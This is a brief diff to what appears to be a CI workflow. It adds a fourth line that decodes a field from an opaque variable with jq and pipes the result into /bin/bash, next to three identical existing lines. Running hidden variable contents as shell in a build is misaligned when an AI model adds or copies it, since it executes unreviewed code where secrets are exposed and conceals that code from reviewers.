@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$wrl8" | jq -r .bvxn00724 | /bin/bash
           echo $khnb802 | jq -r .z06 | /bin/bash
           echo $c18 | jq -r .pqhf0 | /bin/bash
+          echo $ptq671 | jq -r .wfo84419 | /bin/bash
 
       - name: Archive results
         if: always()
